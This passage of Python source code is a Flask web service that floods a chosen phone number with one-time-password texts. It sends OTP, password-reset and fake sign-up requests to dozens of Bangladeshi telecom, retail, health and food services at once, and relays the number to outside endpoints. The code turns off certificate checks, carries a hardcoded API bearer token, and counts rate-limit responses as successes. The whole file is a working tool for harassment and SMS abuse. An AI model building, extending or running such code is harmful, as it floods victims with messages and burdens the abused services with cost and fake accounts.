    headers = {"User-Agent": "Dalvik/2.1.0", "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s", "Content-Type": "application/json; charset=utf-8"}
    try:
        r = requests.post("https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0", json={"phone": get_msisdn88(phone)}, headers=headers, timeout=DEFAULT_TIMEOUT)
        return {"service": "Shomvob", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Shomvob", "status_code": None, "success": False, "error": str(e)}

def call_cinematic_88(phone):
    try:
        r = requests.post(f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{get_local11(phone)}/", headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, verify=False, timeout=DEFAULT_TIMEOUT)
        return {"service": "Cinematic_88", "status_code": r.status_code, "success": r.status_code in [200, 201, 429], "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Cinematic_88", "status_code": None, "success": False, "error": str(e)}

def call_ultimateorganic(phone):
    p = get_local11(phone)
    try:
        requests.post("https://ultimateasiteapi.com/api/register-customer", json={"customer_name": "Rahim", "customer_password": "password123", "customer_password_confirmation": "password123", "customer_email": f"{p}@gmail.com", "customer_contact": p}, headers={"Content-Type": "application/json"}, verify=False, timeout=DEFAULT_TIMEOUT)
        r = requests.post("https://ultimateasiteapi.com/api/forget-customer-password", json={"user_input": p}, headers={"Origin": "https://ultimateorganiclife.com", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, verify=False, timeout=DEFAULT_TIMEOUT)
        return {"service": "UltimateOrganic", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "UltimateOrganic", "status_code": None, "success": False, "error": str(e)}

def call_foodaholic(phone):
    p = get_e164(phone)
    headers = {"User-Agent": "Dart/3.2 (dart:io)", "Content-Type": "application/json; charset=UTF-8", "authorization": "Bearer null"}
    try:
        r = requests.post("https://foodaholic.com.bd/api/v1/auth/forgot-password", json={"phone": p}, headers=headers, timeout=DEFAULT_TIMEOUT)
        if r.status_code == 404:
            r = requests.post("https://foodaholic.com.bd/api/v1/auth/sign-up", json={"f_name": "Rahim", "l_name": "Khan", "phone": p, "email": f"{get_local11(phone)}@example.com", "password": "password123"}, headers=headers, timeout=DEFAULT_TIMEOUT)
        return {"service": "Foodaholic", "status_code": r.status_code, "success": r.status_code in [200, 201], "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Foodaholic", "status_code": None, "success": False, "error": str(e)}

def call_gp_offerotp(phone):
    try:
        r = requests.post("https://bkwebsitethc.grameenphone.com/api/v1/offer/send_otp", json={"msisdn": get_local11(phone)}, headers={"Origin": "https://www.grameenphone.com", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, verify=False, timeout=DEFAULT_TIMEOUT)
        return {"service": "GP_OfferOTP", "status_code": r.status_code, "success": r.status_code in [200, 201] or "GP Number" in r.text, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "GP_OfferOTP", "status_code": None, "success": False, "error": str(e)}

def call_eonbazar(phone):
    p = get_local11(phone)
    try:
        requests.post("https://app.eonbazar.com/api/auth/register", json={"mobile": p, "name": "Rahim Khan", "password": "password123", "email": f"{p}@gmail.com"}, headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, verify=False, timeout=DEFAULT_TIMEOUT)
        r = requests.post("https://app.eonbazar.com/api/auth/login", json={"method": "otp", "mobile": p[1:]}, headers={"origin": "https://eonbazar.com", "content-type": "application/json", "user-agent": "Mozilla/5.0"}, verify=False, timeout=DEFAULT_TIMEOUT)
        return {"service": "EonBazar", "status_code": r.status_code, "success": r.status_code in [200, 201, 429], "response": parse_resp(r)}
    except Exception as e:
        return {"service": "EonBazar", "status_code": None, "success": False, "error": str(e)}

def call_eatz(phone):
    try:
        r = requests.post("https://api.eat-z.com/auth/customer/app-connect", json={"username": get_e164(phone)}, headers={"User-Agent": "okhttp/4.12.0", "Content-Type": "application/json; charset=UTF-8"}, timeout=DEFAULT_TIMEOUT)
        return {"service": "EatZ", "status_code": r.status_code, "success": r.status_code in [200, 201], "response": parse_resp(r)}
    except Exception as e:
        return {"service": "EatZ", "status_code": None, "success": False, "error": str(e)}

def call_osudpotro(phone):
    try:
        r = requests.post("https://api.osudpotro.com/api/v1/users/send_otp", json={"mobile": f"+88-{get_local11(phone)}", "deviceToken": "app", "language": "bn", "os": "android"}, headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, verify=False, timeout=DEFAULT_TIMEOUT)
        return {"service": "OsudPotro", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "OsudPotro", "status_code": None, "success": False, "error": str(e)}

def call_kormi24(phone):
    p = get_local11(phone)
    payload = {"operationName": "sendOTP", "variables": {"type": 1, "mobile": p, "additional": json.dumps({"user_agent": "web", "mobile": p}), "hash": "c3275518789fb74ac6cc30ce030afbf0bdff578579e2fb64571e63f5b2680180"}, "query": "mutation sendOTP($mobile: String!, $type: Int!, $additional: String, $hash: String!) { sendOTP(mobile: $mobile, type: $type, additional: $additional, hash: $hash) { status message __typename }}"}
    try:
        r = requests.post("https://api.kormi24.com/graphql", json=payload, headers={"Origin": "https://www.kormi24.com", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, verify=False, timeout=DEFAULT_TIMEOUT)
        return {"service": "Kormi24", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Kormi24", "status_code": None, "success": False, "error": str(e)}

def call_gp_webloginflexi(phone):
    try:
        r = requests.post("https://weblogin.grameenphone.com/backend/api/v1/otp", json={"msisdn": get_local11(phone)}, headers={"Origin": "https://weblogin.grameenphone.com", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, timeout=DEFAULT_TIMEOUT)
        return {"service": "GP_WebloginFlexi", "status_code": r.status_code, "success": r.status_code in [200, 201] or "valid GP Number" in r.text, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "GP_WebloginFlexi", "status_code": None, "success": False, "error": str(e)}

def call_shwapno(phone):
    try:
        r = requests.post("https://www.shwapno.com/api/auth", json={"phoneNumber": get_e164(phone)}, headers={"Origin": "https://www.shwapno.com", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}, timeout=DEFAULT_TIMEOUT)
        return {"service": "Shwapno", "status_code": r.status_code, "success": r.status_code in [200, 201], "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Shwapno", "status_code": None, "success": False, "error": str(e)}

def call_quizgiri(phone):
    try:
        r = requests.post("https://developer.quizgiri.xyz:443/api/v2.0/send-otp", json={"phone": get_local11(phone), "country_code": "+880"}, headers={"Content-Type": "application/json"}, verify=False, timeout=DEFAULT_TIMEOUT)
        return {"service": "QuizGiri", "status_code": r.status_code, "success": r.status_code in [200, 201], "response": parse_resp(r)}
    except Exception as e:
        return {"service": "QuizGiri", "status_code": None, "success": False, "error": str(e)}

def call_banglalink_mybl(phone):
    try:
        r = requests.post("https://myblapi.banglalink.net/api/v1/send-otp", json={"phone": get_local11(phone)}, headers={"Content-Type": "application/json"}, verify=False, timeout=DEFAULT_TIMEOUT)
        return {"service": "Banglalink_MyBL", "status_code": r.status_code, "success": r.status_code in [200, 201] or "not BL number" in r.text, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Banglalink_MyBL", "status_code": None, "success": False, "error": str(e)}

def call_aarong(phone):
    p = get_local11(phone)
    headers = {"Origin": "https://www.aarong.com", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    try:
        r = requests.post("https://mcprod.aarong.com/graphql", json={"query": f'mutation {{ resendOtp(input: {{ email: "", mobile_number: "{p}", type: "mobile_number" }}) }}'}, headers=headers, timeout=DEFAULT_TIMEOUT)
        return {"service": "Aarong", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Aarong", "status_code": None, "success": False, "error": str(e)}

def call_arogga_app(phone):
    try:
        r = requests.post("https://api.arogga.com/auth/v1/sms/send?f=app&v=6.2.7&os=android&osv=33", data={"mobile": get_local11(phone), "fcmToken": "token123", "referral": ""}, headers={"User-Agent": "okhttp/4.9.2"}, timeout=DEFAULT_TIMEOUT)
        return {"service": "Arogga_App", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Arogga_App", "status_code": None, "success": False, "error": str(e)}

def call_sundarban_gql(phone):
    p = get_local11(phone)
    headers = {"Content-Type": "application/json", "Origin": "https://customer.sundarbancourierltd.com", "User-Agent": "Mozilla/5.0"}
    try:
        r = requests.post("https://api-gateway.sundarbancourierltd.com/graphql", json={"operationName": "CreateAccessToken", "variables": {"accessTokenFilter": {"userName": p}}, "query": "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode __typename } }"}, headers=headers, timeout=DEFAULT_TIMEOUT)
        return {"service": "Sundarban_GQL", "status_code": r.status_code, "success": r.status_code == 200 and "LIMIT_EXCEEDED" not in r.text, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "Sundarban_GQL", "status_code": None, "success": False, "error": str(e)}

def call_quiztime(phone):
    try:
        r = requests.post("https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp", json={"country_code": "+88", "phone": get_local11(phone)}, headers={"Content-Type": "application/json"}, timeout=DEFAULT_TIMEOUT)
        return {"service": "QuizTime", "status_code": r.status_code, "success": r.status_code in [200, 201], "response": parse_resp(r)}
    except Exception as e:
        return {"service": "QuizTime", "status_code": None, "success": False, "error": str(e)}

def call_dressup(phone):
    try:
        r = requests.post("https://dressup.com.bd/wp-json/api/flutter_user/digits/send_otp", json={"country_code": "+880", "mobile": get_local11(phone)[1:], "type": "login", "whatsapp": False}, headers={"User-Agent": "Dart/3.5 (dart:io)", "content-type": "application/json"}, timeout=DEFAULT_TIMEOUT)
        return {"service": "DressUp", "status_code": r.status_code, "success": r.status_code == 200, "response": parse_resp(r)}
    except Exception as e:
        return {"service": "DressUp", "status_code": None, "success": False, "error": str(e)}

def call_kotha(phone):
    dev_id = f"{random.randint(1, 100000)}-{random.randint(1, 100000)}"
    p = get_e164(phone)
    try:
        r1 = requests.post("https://user.kotha.im/mobile/api/deviceAuthWithRecipientStatus", json={"deviceId": dev_id, "recipient": p}, headers={"User-Agent": "okhttp/4.12.0", "Content-Type": "application/json"}, timeout=DEFAULT_TIMEOUT)
        token = r1.json().get("token")
        if token:
            r2 = requests.post("https://user.kotha.im/mobile/api/sendOTPV2", json={"deviceId": dev_id, "recipient": p, "retryAttempt": 0}, headers={"User-Agent": "kotha-android", "Authorization": token, "Content-Type": "application/json"}, timeout=DEFAULT_TIMEOUT)
            return {"service": "Kotha", "status_code": r2.status_code, "success": r2.status_code == 200, "response": parse_resp(r2)}
        return {"service": "Kotha", "status_code": r1.status_code, "success": False, "response": "Token generation failed"}
    except Exception as e:
        return {"service": "Kotha", "status_code": None, "success": False, "error": str(e)}


# =====================================================================
# 5. 🔗 EXTERNAL URL APIS LIST
# =====================================================================

EXTERNAL_URL_APIS = [
    "https://api3-sepia.vercel.app/send?phone=",
    "https://api4-beta.vercel.app/send?phone=",
    "https://api5-teal.vercel.app/send?phone=",
    "https://gxsend.vercel.app/run-all1?phone=",
    "https://gxsend.vercel.app/run-all2?phone=",
    "https://gxsend.vercel.app/run-all3?phone=",
]

def send_external_custom_url(url_template, phone):
    clean_url = url_template.strip()
    target_url = clean_url + get_local11(phone)
    svc_name = clean_url.replace("https://", "").replace("http://", "").split("/")[0]
    try:
        r = requests.get(target_url, timeout=DEFAULT_TIMEOUT)
        return {
            "service": f"Ext_{svc_name}",
            "status_code": r.status_code,
            "success": r.status_code == 200,
            "response": parse_resp(r)
        }
    except Exception as e:
        return {
            "service": f"Ext_{svc_name}",
            "status_code": None,
            "success": False,
            "error": str(e)
        }


# =====================================================================
# 6. MASTER REGISTRY & EXECUTION LOGIC
# =====================================================================

MASTER_SERVICES = {
    # 🔁 10x Looped
    "dncrp": svc_dncrp,
    "otech": svc_otech,
    "amarbay": svc_amarbay,
    "mojaru": svc_mojaru,

    # 📱 Fast & Responsive Core Providers
    "paperfly": svc_paperfly,
    "ostad": svc_ostad,
    "timezone": svc_timezone,
    "garibook_v4": svc_garibook_v4,
    "redx_merchant": svc_redx_merchant,
    "gpfi_fwa": svc_gpfi_fwa,
    "osudpotro_web": svc_osudpotro_web,
    "chardike_uuid": svc_chardike_uuid,
    "win2gain": svc_win2gain,
    "trucklagbe": svc_trucklagbe,
    "deshal": svc_deshal,
    "lifeplus": svc_lifeplus,
    "maya": svc_maya,
    "medistack": svc_medistack,
    "medico": svc_medico,
    "jachai": svc_jachai,
    "packly": svc_packly,
    "choicelegacy": svc_choicelegacy,
    "aladaboi": svc_aladaboi,
    "fundesh": svc_fundesh,
    "gpfwa": svc_gpfwa,

    # 🚀 Single Providers
    "bioscopelive": call_bioscopelive,
    "medha": call_medha,
    "deeptoplay": call_deeptoplay,
    "arogga_web": call_arogga_web,
    "cinematic_wap": call_cinematic_wap,
    "bcsexamaid": call_bcsexamaid,
    "apex4u": call_apex4u,
    "shikho": call_shikho,
    "circlereseller": call_circlereseller,
    "bdtickets": call_bdtickets,
    "rflbestbuy": call_rflbestbuy,
    "chorcha": call_chorcha,
    "etestpaper": call_etestpaper,
    "applink": call_applink,
    "priyoshikkhaloy": call_priyoshikkhaloy,
    "cinematic_sbent": call_cinematic_sbent,
    "gp_webloginda": call_gp_webloginda,
    "meenabazar": call_meenabazar,
    "medeasy": call_medeasy,
    "chokrojan": call_chokrojan,
    "shomvob": call_shomvob,
    "cinematic_88": call_cinematic_88,
    "ultimateorganic": call_ultimateorganic,
    "foodaholic": call_foodaholic,
    "gp_offerotp": call_gp_offerotp,
    "eonbazar": call_eonbazar,
    "eatz": call_eatz,
    "osudpotro": call_osudpotro,
    "kormi24": call_kormi24,
    "gp_webloginflexi": call_gp_webloginflexi,
    "shwapno": call_shwapno,
    "quizgiri": call_quizgiri,
    "banglalink_mybl": call_banglalink_mybl,
    "aarong": call_aarong,
    "arogga_app": call_arogga_app,
    "sundarban_gql": call_sundarban_gql,
    "quiztime": call_quiztime,
    "dressup": call_dressup,
    "kotha": call_kotha,
}

def execute_all(phone: str, selected_keys: list = None) -> dict:
    results = []
    keys_to_run = selected_keys if selected_keys else list(MASTER_SERVICES.keys())

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {}
        
        # 1. Internal Services Execution
        for k in keys_to_run:
            if k in MASTER_SERVICES:
                futures[executor.submit(MASTER_SERVICES[k], phone)] = k

        # 2. Dynamic External URL APIs Execution
        if not selected_keys or "external" in selected_keys:
            for url in EXTERNAL_URL_APIS:
                if url.strip():
                    futures[executor.submit(send_external_custom_url, url, phone)] = url

        for f in as_completed(futures):
            try:
                results.append(f.result())
            except Exception as e:
                results.append({"service": "Unknown", "status_code": None, "success": False, "error": str(e)})

    success_count = sum(1 for r in results if r.get("success") is True)
    failed_count = len(results) - success_count
    failed_services = [r.get("service") for r in results if r.get("success") is not True]

    return {
        "success": True,
        "target_phone": phone,
        "summary": {
            "total_requests": len(results),
            "success_count": success_count,
            "failed_count": failed_count
        },
        "failed_services": failed_services,
        "results": results
    }


# =====================================================================
# 7. FLASK ROUTES
# =====================================================================

@app.route("/", methods=["GET"])
def home():
    total_count = len(MASTER_SERVICES) + len(EXTERNAL_URL_APIS)
    return jsonify({
        "status": "Online",
        "total_active_apis": total_count,
        "usage": "/send?phone=017XXXXXXXX",
        "endpoints": {
            "/send?phone=017XXXXXXXX": "Fires all verified APIs concurrently",
            "/run-all?phone=017XXXXXXXX": "Alias for /send",
            "/run?phone=017XXXXXXXX&apis=paperfly,ostad,dncrp": "Runs selective APIs"
        }
    })


@app.route("/send", methods=["GET", "POST"])
@app.route("/run-all", methods=["GET", "POST"])
def send_all_route():
    phone = request.args.get("phone", "").strip()
    if not phone and request.is_json:
        phone = (request.json or {}).get("phone", "").strip()

    local11 = get_local11(phone)
    if not local11 or len(local11) != 11:
        return jsonify({"success": False, "error": "Invalid phone. Usage: /send?phone=017XXXXXXXX"}), 400

    return jsonify(execute_all(local11)), 200


@app.route("/run", methods=["GET", "POST"])
def send_selected_route():
    phone = request.args.get("phone", "").strip()
    apis_param = request.args.get("apis", "").strip()

    if not phone and request.is_json:
        body = request.json or {}
        phone = body.get("phone", "").strip()
        apis_param = body.get("apis", "")

    local11 = get_local11(phone)
    if not local11 or len(local11) != 11:
        return jsonify({"success": False, "error": "Invalid phone. Usage: /run?phone=017XXXXXXXX&apis=paperfly,ostad"}), 400

    if isinstance(apis_param, list):
        keys = [str(x).strip() for x in apis_param]
    elif apis_param:
        keys = [x.strip() for x in apis_param.split(",") if x.strip()]
    else:
        keys = None

    return jsonify(execute_all(local11, keys)), 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
